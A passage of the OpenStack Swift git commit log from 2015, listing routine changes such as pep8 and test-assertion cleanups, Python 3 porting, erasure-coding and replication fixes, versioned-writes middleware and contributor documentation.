assertIsInstance) which provide better error messages.
Change-Id: I21c730351470031a2dabe5238693095eabdb8964
commit 8aaacbf88d9ea4432e58dd261b98ff95d7c69be6
Author: Victor Stinner <vstinner@redhat.com>
Date: Mon Jul 27 18:55:01 2015 +0200
pep8: Fix hacking H232 warnings (octal)
Fix warnings "H232: Python 3.x incompatible octal 000001234 should be
written as 0o1234".
Change-Id: I9a7bbb034357783885ac3e18fe1e9e32a5951616
commit 5b01c5eadc3a13607d2581a55007700fca0b00af
Author: Bill Huber <wbhuber@us.ibm.com>
Date: Fri Aug 7 16:24:28 2015 -0500
Add unit test for container\_update for unmounted device
This unit test case gains coverage for container/update.py
where a device (i.e. sda1) is not mounted and the code
responds with a warning logger that the device is not
mounted and continues. Coverage increases 2% as a result.
Change-Id: I33d247a930b28604093df4ade1ce7dbbd24aac54
commit d6267c1f95a7fcd2b0e4f15d5efc6bcfe2114de0
Author: Clément Contini <ccontini@cloudops.com>
Date: Wed Aug 12 15:00:45 2015 -0400
Keep user id and project id in subrequests env
Keep HTTP\_X\_USER\_ID and HTTP\_X\_PROJECT\_ID to be available as
user\_id and project\_id in storage.objects.outgoing.bytes in
ceilometer when downloading a multipart object.
Change-Id: I0f4734f021e5d6e84d48ed9bebeb321d7a9590ad
Closes-Bug: #1477283
commit eaa006464cb98a2f36809edfa13bd3dcaebc9952
Author: John Dickinson <me@not.mn>
Date: Mon Aug 17 22:13:42 2015 -0700
move global statement up a few lines
Change-Id: I190d2d530c6c0525d988cc88b0965b48a291fffb
commit 1a81cda8b7eba0d25ea7341da756bb588cae8d73
Author: Hamdi Roumani <roumani@ca.ibm.com>
Date: Mon Aug 3 17:45:56 2015 -0400
Doc instructions for post rebase steps
Improve the 'first\_contribution\_swift' by adding instructions for how to
rebuild swift following a rebase.
Change-Id: If5c91dc4e1e8d1712bbd8b326c675967fb4b8c15
commit 79ba4a85983641e539b620bd143e62673c98416e
Author: Hisashi Osanai <osanai.hisashi@jp.fujitsu.com>
Date: Wed Dec 3 06:15:16 2014 +0900
Enable Object Replicator's failure count in recon
This patch makes the count of object replication failure in recon.
And "failure\_nodes" is added to Account Replicator and
Container Replicator.
Recon shows the count of object repliction failure as follows:
$ curl http://<ip>:<port>/recon/replication/object
{
"replication\_last": 1416334368.60865,
"replication\_stats": {
"attempted": 13346,
"failure": 870,
"failure\_nodes": {
"192.168.0.1": {"sdb1": 3},
"192.168.0.2": {"sdb1": 851,
"sdc1": 1,
"sdd1": 8},
"192.168.0.3": {"sdb1": 3,
"sdc1": 4}
},
"hashmatch": 0,
"remove": 0,
"rsync": 0,
"start": 1416354240.9761429,
"success": 1908
},
"replication\_time": 2316.5563162644703,
"object\_replication\_last": 1416334368.60865,
"object\_replication\_time": 2316.5563162644703
}
Note that 'object\_replication\_last' and 'object\_replication\_time' are
considered to be transitional and will be removed in the subsequent
releases. Use 'replication\_last' and 'replication\_time' instead.
Additionaly this patch adds the count in swift-recon and it will be
showed as follows:
$ swift-recon object -r
========================================================================
=======
--> Starting reconnaissance on 4 hosts
========================================================================
=======
[2014-11-27 16:14:09] Checking on replication
[replication\_failure] low: 0, high: 0, avg: 0.0, total: 0, Failed: 0.0%,
no\_result: 0, reported: 4
[replication\_success] low: 3, high: 3, avg: 3.0, total: 12,
Failed: 0.0%, no\_result: 0, reported: 4
[replication\_time] low: 0, high: 0, avg: 0.0, total: 0, Failed: 0.0%,
no\_result: 0, reported: 4
[replication\_attempted] low: 1, high: 1, avg: 1.0, total: 4,
Failed: 0.0%, no\_result: 0, reported: 4
Oldest completion was 2014-11-27 16:09:45 (4 minutes ago) by
192.168.0.4:6002.
Most recent completion was 2014-11-27 16:14:19 (-10 seconds ago) by
192.168.0.1:6002.
========================================================================
=======
In case there is a cluster which has servers, a server runs with this
patch and the other servers run without this patch. If swift-recon
executes on the server which runs with this patch, there are unnecessary
information on the output such as [failure], [success] and [attempted].
Because other servers which run without this patch are not able to
send a response with information that this patch needs.
Therefore once you apply this patch, you also apply this patch to other
servers before you execute swift-recon.
DocImpact
Change-Id: Iecd33655ae2568482833131f422679996c374d78
Co-Authored-By: Kenichiro Matsuda <matsuda\_kenichi@jp.fujitsu.com>
Co-Authored-By: Brian Cline <bcline@softlayer.com>
Implements: blueprint enable-object-replication-failure-in-recon
commit eeb0fa40a19917e6548f95f0bd3c08736928449b
Author: Christian Schwede <cschwede@redhat.com>
Date: Thu Aug 6 07:21:15 2015 +0000
Make swift-ring-builder filename usage more consistent
Sometimes the given argument is internally altered and another filename is used
without a note to the operator. Even worse, a given .ring.gz filename is
sometimes written out as builder file, without updating the corresponding
.builder file.
There is already a method to parse the given argv and return the name of the
builder and ring file. However, it's rarely used and no warning is given to the
user if it is altered. This patch uses the already parsed builder and ring file
name instead of argv[1], and also adds a note to the user if the used filename
is differently to the one given as argument.
Closes-Bug: 1482096
Change-Id: I2f8ef23aeab8b07caaa799f7dcd57e684b4b2ad2
commit b75d2a4e37d4c86763a2cc56c6dd53ebe2e0de19
Author: Bill Huber <wbhuber@us.ibm.com>
Date: Mon Aug 17 13:54:44 2015 -0500
Quorum on durable response is too low
Increase the .durable quorum from 2 to "parity + 1" to guarantee
that we will never fail to rebuild an object. Otherwise, with
low durable responses back (< parity + 1), the putter objects
return with failed attribute set to true, thereby failing the
rebuild of fragments for an object.
Change-Id: I80d666f61273e589d0990baa78fd657b3470785d
Closes-Bug: 1484565
commit fa35e38c9f83f704eb087f80157cbe33b23b9db2
Author: Kai Zhang <zakir.exe@gmail.com>
Date: Fri Aug 14 16:46:35 2015 -0700
Fix some minor typos
Fixed some typos in function name and comments.
Change-Id: Ida76ab4b331a51b71e57650702acc136e66ba4b2
commit 5b246e875fe9ac3d764ea581ad52b04238f5bcc8
Author: Kota Tsuyuzaki <tsuyuzaki.kota@lab.ntt.co.jp>
Date: Wed Jul 22 10:39:22 2015 -0700
Fix EC range GET/COPY handling
When range GET (or COPY) for an EC object requested, if the requested range
starts from more than last segments alignment (i.e.
ceil(object\_size/segment\_size) \* segment\_size), proxy server will return
the original content length w/o body, though Swift should return an error
massage as a body and the length of message as the content length.
The current behavior will cause stuck on some client. (e.g. curl)
This patch fixes that proxy enables to return correct response, even if such
an over range requested.
Co-Authored-By: Clay Gerrard <clay.gerrard@gmail.com>
Change-Id: I21f81c842f563ac4dddc69011ed759b744bb20bd
Closes-Bug: #1475499
commit 7064706b2721c36c5181267f58704b9344ad4ac0
Author: Samuel Merritt <sam@swiftstack.com>
Date: Tue Aug 11 10:17:20 2015 -0500
Fix 500 in versioned writes with bad Destination
When this code lived in the proxy, it was protected by an "except
HTTPException" clause in proxy.Application.handle\_request(). When it
moved to middleware, it lost that, and then things like
constraints.check\_name\_format that raised HTTPException would cause
500s. The HTTPException would make it all the way out to catch\_errors
and get translated to a 500.
This commit just wraps a couple try/excepts around the bits in
versioned writes that can raise HTTPException. I tried to make it use
wsgify so I could get that for free, but that wound up being a real
pain because env/start\_response are plumbed through pretty much the
whole versioned-writes middleware.
Closes-Bug: 1483705
Change-Id: Ife165bf709e64f313ed07c779b21914045e51f25
commit 035a411660ca02983cd486312266c67d78a2359c
Author: Thiago da Silva <thiago@redhat.com>
Date: Sun Nov 9 13:13:27 2014 -0500
versioned writes middleware
Rewrite object versioning as middleware to simplify the PUT method
in the object controller.
The functionality remains basically the
same with the only major difference being the ability to now
version slo manifest files. dlo manifests are still not
supported as part of this patch.
Co-Authored-By: Clay Gerrard <clay.gerrard@gmail.com>
DocImpact
Change-Id: Ie899290b3312e201979eafefb253d1a60b65b837
Signed-off-by: Thiago da Silva <thiago@redhat.com>
Signed-off-by: Prashanth Pai <ppai@redhat.com>
commit 968c91a465627bb9317ed6e2ae9ccd818c83c0c4
Author: Alistair Coles <alistair.coles@hp.com>
Date: Tue Jul 28 10:31:54 2015 +0100
Replace assertTrue(not <condition>) with assertFalse(<condition>)
The replacement of assert\_ with assertTrue [1] resulted in a number of
tests using calls of the form assertTrue(not <condition>). This patch
replaces those with assertFalse(<condition>).
[1] change I74705c6498249337bfdf955d62e0ad972035bc1f
Change-Id: I78b49558f4425c2335df187b1793d1e4b3c514b1
commit 4ac1fea5d111c669ff827f4eb29c0735cbad6ba5
Author: Zhao Lei <zhaolei@cn.fujitsu.com>
Date: Fri Aug 7 22:07:01 2015 +0800
Fix some spelling typo in comments
s/overide/override for object-expirer.conf and sample.
s/automaticaly/automatically for swift/proxy/controllers/obj.py
Change-Id: Ife107c7a1005a5d4959288db50a7f8f33c522dd4
Signed-off-by: Zhao Lei <zhaolei@cn.fujitsu.com>
commit 9456af35a2832aeafc4a4e78ebd0d4142ead71cd
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Thu Aug 6 00:55:36 2015 +0530
pep8 fix: assertEquals -> assertEqual
assertEquals is deprecated in py3,changes in
dir:
\*test/unit/obj/\*
\*test/unit/test\_locale/\*
Change-Id: I3dd0c1107165ac529f1cd967363e5cf408a1d02b
commit 1952451ed7e97e2bfa3b11dfa5000cc39f712084
Author: Zhao Lei <zhaolei@cn.fujitsu.com>
Date: Fri Aug 7 21:57:08 2015 +0800
Fix a spelling typo in comment
s/automaticaly/automatically/ for swift/proxy/controllers/obj.py
Change-Id: I405441383739637e0b13746d6f4e2bad1c874b4d
Signed-off-by: Zhao Lei <zhaolei@cn.fujitsu.com>
commit c35cc13b8abeb97400632cbe8ec56fc1040d8210
Author: Bill Huber <wbhuber@us.ibm.com>
Date: Thu Aug 6 10:01:17 2015 -0500
pep8 fix: assertEquals -> assertEqual
assertEquals is deprecated in py3 in the following dir:
test/unit/proxy/\*
Change-Id: Ie2c7e73e1096233a10ee7fbf6f88386fa4d469d6
commit 239e94e62518f36601fb18119700269753d02a01
Author: Bill Huber <wbhuber@us.ibm.com>
Date: Thu Aug 6 09:28:51 2015 -0500
pep8 fix: assertEquals -> assertEqual
assertEquals is deprecated in py3 in the following dir:
test/probe/\*
Change-Id: Ie08dd7a8a6c48e3452dfe4f2b41676330ce455d5
commit 49b9ba37ac522502ccad66fba7bfef375eab145d
Author: Bill Huber <wbhuber@us.ibm.com>
Date: Wed Aug 5 14:51:32 2015 -0500
pep8 fix: assertEquals -> assertEqual
assertEquals is deprecated in py3 in the following dir:
test/functional/\*
Change-Id: Iee7f8ffca9838ccc521107180697d91ac9559405
commit 81816bebe6b3506af8cabaa7ebe265c70f3499cd
Author: kenichiro matsuda <matsuda\_kenichi@jp.fujitsu.com>
Date: Thu Aug 6 10:13:02 2015 +0900
Fix shebang of commands
Fix shebang of following commands.
$ grep '#!/usr/bin/python' swift/bin/\*
swift/bin/swift-account-info:#!/usr/bin/python
swift/bin/swift-container-info:#!/usr/bin/python
swift/bin/swift-container-sync:#!/usr/bin/python
swift/bin/swift-recon:#!/usr/bin/python
swift/bin/swift-ring-builder:#!/usr/bin/python
swift/bin/swift-ring-builder-analyzer:#!/usr/bin/python
Change-Id: I564d1d8abd76eba57730fc2f30263b0a0f809867
Closes-Bug: #1481623
commit 652f0f9da408e955843f87a504b3dab5be3cff80
Author: Pete Zaitcev <zaitcev@kotori.zaitcev.us>
Date: Wed Aug 5 15:33:29 2015 -0600
Having said H, I, J, we ought to say K
In the long run, we might want to stop these updates. But this
decision is above my pay grade.
Change-Id: I335558e1da8052be1b215fbad51244b47af3d81b
commit ed3aec2146b114c85bb3b196c999bf3f44fe159e
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Thu Aug 6 00:18:52 2015 +0530
pep8 fix: assertEquals -> assertEqual
assertEquals is deprecated in py3 in
dir: test/unit/container/\*
Change-Id: I3333022ed63ce03198bc73147246d91d2442a440
commit f449e914728fdcaf0870c15b9fc5ebd16a9df916
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Wed Aug 5 22:32:02 2015 +0530
pep8 fix: assertEquals -> assertEqual
assertEquals is deprecated in py3, fixing in:
dir: test/unit/cli/\*
Change-Id: I9a2fc1f717beafd5fa8408942046e310e8de0318
commit 6594bbebb582801c069c4966352fee19eadef2f8
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Wed Aug 5 22:25:46 2015 +0530
pep8 fix: assertEquals -> assertEqual
assertEquals is deprecated in py3 in
dir : test/unit/account/\*
Change-Id: I70415197df1b0d58d4d6e219733c13a9c9cdfff7
commit 89f59062864e5cbfc839a6084c323ce35438aa57
Author: Ben Martin <blmartin@us.ibm.com>
Date: Mon Jul 27 14:19:09 2015 -0500
+Document method to avoid rsync filling root drive
When rsync pushes to a remote node with an unmounted drive and if
certain steps are not taken, rsync may attempt to write files to
the local drive at the location where the drive was mounted.
There are two suggested solutions for this issue:
1) Set the permissions for all mount points in /srv/node/
to root:root 755
2) Mount the drives elsewhere and symlink the drives to /srv/.../
The first method ensures that only root and not the swift user
can write in the /srv/.../ directories.
The second method will prompt a broken link issue if rsync
attempts to write to an unmounted drive.
Change-Id: I60ce4ed9ef8401768d5f78b6806cbb2e2a65303e
Closes-Bug: #1470576
commit f0d51882b921075f5309ed6ff07385dc6103d4dc
Author: Charles Hsu <charles0126@gmail.com>
Date: Wed Aug 5 22:09:40 2015 +0800
Add extra\_header\_count to document and config.
Change-Id: Iec86b488d71553c295afe7098822ce2046df9546
commit 7071762d3698c59fabdee76890e300f81417be74
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Tue Aug 4 23:15:37 2015 -0700
Fix TypeError if backend response doesn't have expected headers
There was some debug logging mixed in with some error handling on PUTs
that was relying on a very specific edge would only encounter a set of
backend responses that included the expected set of headers to diagnoise
the failure.
But the backend responses may not always have the expected headers.
The proxy debug logging should be more robust to missing headers.
It's a little hard to follow, but if you look `\_connect\_put\_node` in
swift.proxy.controller.obj - you'll see that only a few connections can
make their way out of the initial put connection handling with a "resp"
attribute that is not None. In the happy path (e.g. 100-Continue) it's
explictly set to None, and in most errors (Timeout, 503, 413, etc) a new
connection will be established to the next node in the node iter.
Some status code will however allow a conn to be returned for validation
in `\_check\_failure\_put\_connections`, i.e.
\* 2XX (e.g. 0-byte PUT would not send Expect 100-Continue)
\* 409 - Conflict with another timestamp
\* 412 - If-None-Match that encounters another object
... so I added tests for those - fixing a TypeError along the way.
Change-Id: Ibdad5a90fa14ce62d081e6aaf40aacfca31b94d2
commit 01848c565e5821d2500cb234261c70871e562ebe
Author: David Goetz <dpgoetz@gmail.com>
Date: Fri Jun 26 17:27:31 2015 -0700
Speed up reaper for a big account delete and some better error handling
In run\_forever mode, run the reaper on all three copies of the account
DB instead of just the first one and shard the containers between them.
Change-Id: Id182e89dad70df9d6d9988523861b8085d74c765
commit 5b24b2249878e25ee702ee4237227c984036c6ec
Author: OpenStack Proposal Bot <openstack-infra@lists.openstack.org>
Date: Tue Aug 4 06:29:11 2015 +0000
Imported Translations from Transifex
For more information about this automatic import see:
https://wiki.openstack.org/wiki/Translations/Infrastructure
Change-Id: I9f0e5fd25ec143fb87de1895794764dea4587f93
commit 8d06f56c1fac23bca463d3a93353da6b50ad5bed
Author: Takashi NATSUME <natsume.takashi@lab.ntt.co.jp>
Date: Tue Aug 4 10:14:25 2015 +0900
Fix typo of 'receive'
Change-Id: Ic01defa8d48ba4b7f4bd6cbe4d59b9bab468a36c
commit 310ac18d61b001bdf297505243d8aa62e8fde8fe
Author: Brian Reitz <brian.reitz@oracle.com>
Date: Mon Aug 3 16:28:31 2015 -0500
Convert docstring to a comment in test\_denied\_DELETE\_of\_versioned\_object unit test.
Docstrings cause issues for nose and created non standard test output for this test.
Change-Id: I91e6450480567de0ee0b18d3efae01a4b94f0a86
commit 21a7b4aaa6f991c0eeb8f74876b14fe22713586b
Author: Alistair Coles <alistair.coles@hp.com>
Date: Mon Aug 3 14:58:24 2015 +0100
Test that get\_hashes ignores only removed hash dir
Add test for case not yet covered by unit tests: suffix dir
has two hash dirs, one with expired tombstone. That hash dir gets
removed and its hash is not included in the suffix hash, but the
remaining hash dir's hash is reported.
Change-Id: I031a022daed6b8a66dfd04bea1b4d5eebcb882b3
commit 44917c8a90e79a85cd6c6821d8b6d043f83b322d
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Mon Jul 20 13:06:48 2015 -0700
Handle removed suffix dirs the same as empty suffix dirs
When hashes suffix dirs, the directory might have gotten cleaned up while
still appearing in hashes.pkl. It would even get cleaned up the next time.
For example, given this really old tombstone:
objects/846/3d0/d3a20154d0a828a032aba6860397c3d0/1432267961.41808.ts
Prior to this commit, a call to get\_hashes() would reap the old
tombstone and any empty containing dirs, but the resulting hashes.pkl
would still contain {'3d0': 'd41d8cd98f00b204e9800998ecf8427e'} even
though there's no such suffix dir any more.
("d41d8cd98f00b204e9800998ecf8427e" is the MD5 of the empty string.)
Then, a \*subsequent\* get\_hashes() call would omit 3d0 from the resulting
hash, so then hashes.pkl would no longer contain 3d0. This difference
would result in a little useless replication traffic while nodes without
a particular part/suffix pair, but who disagreed on how that showed up
in hashes.pkl, tried to push their version of nothing to one another.
Now, an empty suffix dir doesn't appear in hashes.pkl at all, whether
it's for replication or EC, or whether it's for the get\_hashes() call
that reaped the suffix dirs or not.
Co-Author: Samuel Merritt <sam@swiftstack.com>
Change-Id: Ie1bfb1cc56d0fc030c6db42f97b55d140695cf1f
commit cf4d50bd68b658d35759fb56446557858dcd9572
Author: Alistair Coles <alistair.coles@hp.com>
Date: Fri Jun 5 13:06:29 2015 +0100
Make test\_proxy work independent of env vars
test.unit.common.test\_internal\_client.TestSimpleClient.test\_proxy
will fail if the environment has http\_proxy set and does not have
no\_proxy=127.0.0.1 set. This seems to be because urllib overrides
any proxy arg passed to the Request with the env http\_proxy var,
unless the Request host is in no\_proxy.
We don't need to test urllib, so this patch changes the test to
simply ensure that swift code does pass the correct proxy arg to
urllib2.urlopen. That avoids testers having to make sure their
env vars are compliant to successfully run unit tests. While it is
reasonable to think that 127.0.0.1 is in the no\_proxy list, it
shouldn't be a requirement pass swift tests.
Change-Id: Iff91acdb76fabe7056b3e90e2756e27fe5105817
commit 67513fc17c23066f6547b5e3c4ab2dc852e4f7f0
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Sat Jun 27 23:26:47 2015 +0530
Adding bandit for security static analysis testing in swift
This change adds a basic bandit config for Swift. It can be invoked
by running the tox environment for bandit;
tox -e bandit
This is an initial step for using bandit with Swift
and it should be revisited to improve the testing as more is learned
about the specific needs of the Swift code base.As per now some tests
are excluded as they were used on purpose.
https://wiki.openstack.org/wiki/Security/Projects/Bandit
Implements: blueprint swift-bandit
Change-Id: I621be9a68ae9311f3a6eadd1636b05e646260cf2
commit 768d7ab074807175471d589de96d091e3239052e
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Thu Jul 30 15:30:35 2015 -0700
Add a probetest for HUP/reload
This would have been enough to catch the regression, and we can extend
them as we work on any future ehancements to our process management.
Change-Id: I9a1b57aa15663380c45cf783afc8212ab4ffbace
commit 207dd9b49d7d53a9faa4849af2c40bb875416fce
Author: Darrell Bishop <darrell@swiftstack.com>
Date: Thu Jul 30 14:32:08 2015 -0700
Fix regression in WSGI server SIGHUP behavior
The SIGHUP receipt used to pop us out of an os.wait() where now, it's in
a "green" wait() and Timeout() combo, some part of which eats the signal
receipt. This causes the while loop condition to never get checked and
SIGHUP no longer works as a server reload command.
The fix is to loop at least every 0.5 seconds, as a trade-off between
not busy-waiting and checking the "keep running" condition often enough
to feel responsive.
Change-Id: I95283b8b7cfc2998ab5813e0ad3ca1fa231696c8
Closes-Bug: #1479972
commit bcd00d9461603db1477c5f1e9f8dd6405a319eb9
Author: Alistair Coles <alistair.coles@hp.com>
Date: Mon Jun 8 19:40:56 2015 +0100
Refactor diskfile
This patch mostly eliminates the duplicate code that was
deliberately left in place during EC review to avoid major
churn of the diskfile module prior to the kilo release.
This focuses on obvious de-duplication and shuffling code
between classes. It deliberately does not attempt to
hammer out every last piece of de-duplication where that
would introduce more complex changes - that can come later.
Code is moved from the module level and from ECDiskFile\*
classes into new BaseDiskFile\* classes.
Concrete classes for replication and EC policy retain their
existing names i.e. DiskFile[Manager|Writer|Reader|] and
ECDiskFile[Manager|Writer|Reader|] respectively.
Knock-on changes:
- fix bug whereby get\_hashes was ignoring self.reclaim\_age
and always using the default arg value.
- replication diskfile manager now deletes a tombstone that is older
than reclaim\_age even when there is a newer .meta file.
- replication diskfile manager will no longer raise an
AssertionError if only a .meta file is found during
hash\_cleanup\_listdir.
- fix stale test in test\_auditor.py: test\_with\_tombstone test
setup was convoluted (probably dates back to when object puts
did not clean up the object dir). Now that they do you have to
try harder to create a dir with a tombstone and a data file.
Change-Id: I963e0d0ae0d6569ad1de605034c529529cbb4f9a
commit 9cb7eb4a4b6cdab8a5f16b3dc800b39ab4068522
Author: Victor Stinner <vstinner@redhat.com>
Date: Mon Jul 27 11:34:07 2015 +0200
Update hacking to 0.10.0
Replace the whitelist of flake8 checks (select) with a blacklist
(ignore). It makes possible to disable a single check, which was not
possible before. This new approach permits to enable new tests more
easily and see which checks are currently disabled.
Only new checks are disabled, this change doesn't run less checks than
before. Currently, many checks are disabled, but following changes will
fix these new warnings.
When the "select" option of flake8 is used in tox.ini, the "ignore"
option is ignored. It is not possible to use "select" and "ignore"
options at the same time. See the code in pep8 (flake8 is based on
pep8):
https://github.com/PyCQA/pep8/blob/d48eef071003952ed0f98445dc3dc6bc29618f9c/pep8.py#L1808
The purpose of flake8 is to enhance the coding style, but also to help
to detect common bugs. Blacklisting checks permits to detect new bugs
when upgrading the tools. For example, new checks were recently added to
help porting code to Python 3.
This change permits to use pbr 1.0 and newer which is required to
support Python 3. Previously, hacking 0.8.1 was used, but hacking 0.8 is
incompatible with pbr 1.0 and newer (hacking 0.8 requires pbr<1.0).
pbr 1.0 is required to use environment markers on requirements to
install dnspython on Python 2 and dnspython3 on Python 3.
Change-Id: I41d63b9467083d7606ad18aaa398ca7738b27fae
commit 389a97e3526df68121cecfaf1909343b5d381cbc
Author: Victor Stinner <vstinner@redhat.com>
Date: Wed Jul 29 23:46:58 2015 +0200
Fix pep8 E warning for hacking 0.10
Fix pep8 warnings of the E category of hacking 0.10:
\* E113: unexpected indentation
\* E121: continuation line under-indented for hanging indent
\* E122: continuation line missing indentation or outdented
\* E123: closing bracket does not match indentation of opening bracket's
line
\* E126: continuation line over-indented for hanging indent
\* E251: unexpected spaces around keyword / parameter equals
Change-Id: I0b24eebdf1a37dc1b572b6c9a3d3d4832d050237
commit d719064e788ec5fa70305fadaa46affcb603a9bb
Author: Victor Stinner <vstinner@redhat.com>
Date: Thu Jul 30 00:28:44 2015 +0200
Fix warning pep8 E128 warning of hacking 0.10
Fix the warning E128: "continuation line under-indented for visual
indent" of pep8.
Change-Id: Ie6c6ae341fe3d6281f2095c1d756d552fa5937f9
commit a0db56dcde83096708e6fe64ae9338098e0ba98a
Author: Victor Stinner <vstinner@redhat.com>
Date: Thu Jul 30 00:16:06 2015 +0200
Fix pep8 E265 warning of hacking 0.10
Fix the warning E265 "block comment should start with '# '" added in pep
1.5.
Change-Id: Ib57282e958be9c7cddffc7bca34fbbf1d4c460fd
commit 345785837f1caa01fec5bca091c70481d7069bea
Author: Charles Hsu <charles0126@gmail.com>
Date: Thu Jul 30 13:11:00 2015 +0800
Remove error\_suppression\_interval, error\_suppression\_limit options.
These two options is belong to proxy-server, not account-replicator.
Change-Id: Ie030ecffd213e56db32df77c69b847479d96308f
commit 5a7383313b1c555df5fd47050f7ee3810b5e31fc
Author: Carlos Cavanna <ccavanna@ca.ibm.com>
Date: Tue Jul 28 19:15:25 2015 -0400
Swift documentation for first-time contributors.
In this change, there are proposed improvement to Swift documentation aimed at
first-time contributors. They include a simplification of the Getting
Started page and a new page with some basic instructions/commands that the
first-time contributor should know. In addition, it shows some common errors
that the first-time contributor may find when executing git rebase and
information on how to track your changes.
Change-Id: I704202955093736b2f3b4102a649690a0392c6b0
commit 5b5c8820024141bc6ae49d7646a92fb53667ea9b
Author: Alistair Coles <alistair.coles@hp.com>
Date: Wed Jul 29 12:36:35 2015 +0100
Remove unused code in swift/obj/server.py
keep\_cache was defined twice
Change-Id: I5f775f618669e3dabfc3bc54dd7bd2cd7f00b2f0
commit 0c27cb07caf1027cd9734e8bd34d9759da33e667
Author: OpenStack Proposal Bot <openstack-infra@lists.openstack.org>
Date: Wed Jul 29 06:36:01 2015 +0000
Imported Translations from Transifex
For more information about this automatic import see:
https://wiki.openstack.org/wiki/Translations/Infrastructure
Change-Id: Ic30cb1dc8f12280a52cc1f07a1cf516397ed680e
commit c5b5cf91a984f80cc6cbe42735b242083d700542
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Tue Jul 28 21:03:05 2015 +0530
test/unit: Replace python print operator with print function (pep H233, py33)
'print' function is compatible with 2.x and 3.x python versions
Link : https://www.python.org/dev/peps/pep-3105/
Python 2.6 has a \_\_future\_\_ import that removes print as language syntax,
letting you use the functional form instead
Change-Id: I94e1bc6bd83ad6b05695c7ebdf7cbfd8f6d9f9af
commit 117b61976fbf14d8a0d2157256f9a3230421ee72
Author: Samuel Merritt <sam@swiftstack.com>
Date: Wed Jul 22 15:40:55 2015 -0700
functests: use assertIn and assertNotIn
We have a bunch of assertions like
self.assertTrue(resp.status in (200, 204))
Sometimes we get smart about failure messages and have something like
self.assertTrue(resp.status in (200, 204), resp.status)
so we can see what the status was when it failed.
Since we don't have to support Python 2.6 any more, we can use
assertIn/assertNotIn and get nice failure messages for free.
Change-Id: I2d46c9969d41207a89e01017b4c2bc533c3d744f
commit 8fe8bee7e0c5c9d34d7a8e6ab090c8d65c5ca78e
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Tue Jul 21 18:06:32 2015 +0530
test/(functional, probe): Replace "self.assert\_" by "self.assertTrue"
The assert\_() method is deprecated and can be safely replaced by assertTrue().
This patch makes sure that running the tests does not generate warnings
all over the screen.
Change-Id: I74705c6498249337bfdf955d62e0ad972035bc1f
commit 4a6e0ccc69302a5384b988149e294656323d7f20
Author: Samuel Merritt <sam@swiftstack.com>
Date: Mon Jul 20 11:58:35 2015 -0700
Rename WsgiStringIO -> WsgiBytesIO.
If we're going to have a subclass of BytesIO, having "StringIO" in its
name is just asking for confusion.
Change-Id: I695ab3105b1a02eb158dcf0399ae91888bc1c0ac
commit 5ee742c17d9ea92ca7332cb67db0cce64b7a0d8f
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Fri Jul 24 21:19:47 2015 +0530
Modifying Lambda function tuple usage for python3
Current tuple unpacking is not supported in python3
Change-Id: I15a8e977684d19154cf2233caf1174f6983ac9e2
commit 6f89f71f9ba11f7b4126b80076a0f13792332e1e
Author: Alistair Coles <alistair.coles@hp.com>
Date: Wed Apr 15 16:17:23 2015 +0100
Filter Etag key from ssync replication-headers
ssync rx sends a header X-Backend-Replication-Headers whose value is a
list of headers that the source object has. This list extends the list
of allowed headers on the target object server, so that the target
object metadata is faithfully reconstructed to match the source.
Unfortunately the combination of lower() and title() operations on
header keys results in the source 'ETag' value being added to the target
metadata under the key 'Etag' in addition to the 'ETag' key that the
receiving server adds (note different capitilization), both having
the same value.
The spurious 'Etag' metadata is potentially confusing for humans
inspecting the object metadata and complicates tests that wish to
assert the equality of two object metadata dicts. See for example the
test in test\_ssync\_sender.py that this patch cleans up.
Furthermore, the possibility of having both Etag and ETag keys has
required a workaround in the EC reconstructor [1].
[1] reconstructor fix change id: Ie59ad93a67a7f439c9a84cd9cff31540f97f334a
Change-Id: I0c89cf7924a4471bb6d268b5ef3884e2d2cb4286
commit e2f69138bf5fcdd84ac23be6b0bec1bb006b41f5
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Thu Jul 23 16:46:48 2015 -0700
Fix string formatting in dispersion cli command
... and add a basic test that would have prevented the regression
Change-Id: I4c5f643ee291dcc1397ca951450459d8b8ad0bbd
commit 83025ff38dfea3d4e3f27dc045128a7aa4ba11e4
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Fri Jul 24 11:09:10 2015 -0700
Use right most occurrence object dir in diskfile.extract\_policy
I like using the rightmost one more; it's basically
/operator-defined/mountpoint/objects/part/suffix/hash/ts.data, so I
don't see any opportunity for other things named "objects" to creep in on the
right of the real objects-N dir; but I could see some admin using
/srv/object-storage/ or something
-- Torgomatic The Wise
Change-Id: I0a63a3e02df091a5ee2e110a345183012e357a2f
commit 363a256e58ee0f3e9f059352c2de968e3dc398e3
Author: Falk Reimann <falk.reimann@sap.com>
Date: Wed Jun 24 16:54:02 2015 +0200
Support keystone v3 domains in swift-dispersion
This provides the capability to specify a project\_name,
project\_domain\_name and user\_domain\_name in /etc/swift/dispersion.conf.
If this values are set in dispersion.conf they get populated to the
swift-client. With this it is possible to have a specific dispersion
project specified, which is not the keystone default domain. Changes
were applied to swift-dispersion-populate and swift-dispersion-report.
Relevant man pages, the example dispersion.conf and the admin guide were
updated accordingly.
DocImpact
Closes-Bug: #1468374
Change-Id: I0e716f8d281b4d0f510bc568bcee4a13fc480ff7
commit 3d9b2d077a157279fb6cd107a0c83727106af3ef
Author: Daisuke Morita <morita.daisuke@lab.ntt.co.jp>
Date: Fri Jul 24 10:42:10 2015 +0900
Fix swift-object-info to show policy index at deep working directory
If swift-object-info command is executed at deeper working directory
than 'objects-\*' directory, it cannot parse policy index from file path
so it does not show appropriate policy index. This patch fixes this
problem by simply extracting the full path of a target object file.
Change-Id: Idb734106a44b6121119c9b1dc8cdaaf4c6c28c31
Closes-Bug: 1469951
commit e24d7c36fa9758618ef88ed1a8e19f4d7bb0404f
Author: Victor Stinner <vstinner@redhat.com>
Date: Mon May 25 18:26:38 2015 +0200
Use six to fix imports on Python 3
Get configparser, queue, http\_client modules from six.moves.
Patch generated by the six\_moves operation of the sixer tool:
https://pypi.python.org/pypi/sixer
Change-Id: I666241ab50101b8cc6f992dd80134ce27327bd7d
